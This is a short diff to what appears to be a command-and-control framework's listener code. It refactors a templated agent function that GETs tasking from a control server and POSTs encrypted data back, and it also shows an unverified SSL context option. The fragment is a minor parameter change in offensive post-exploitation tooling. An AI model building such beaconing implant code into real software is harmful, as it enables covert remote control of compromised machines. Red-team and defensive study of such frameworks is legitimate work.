@@ -842,16 +842,11 @@ class Listener:
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
 
                 sendMessage = """
-def send_message(packets=None):
+def send_message(packets=None, server = None, headers = None, taskURIs = None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
-
-    global missedCheckins
-    global server
-    global headers
-    global taskURIs
 
     data = None
     if packets:
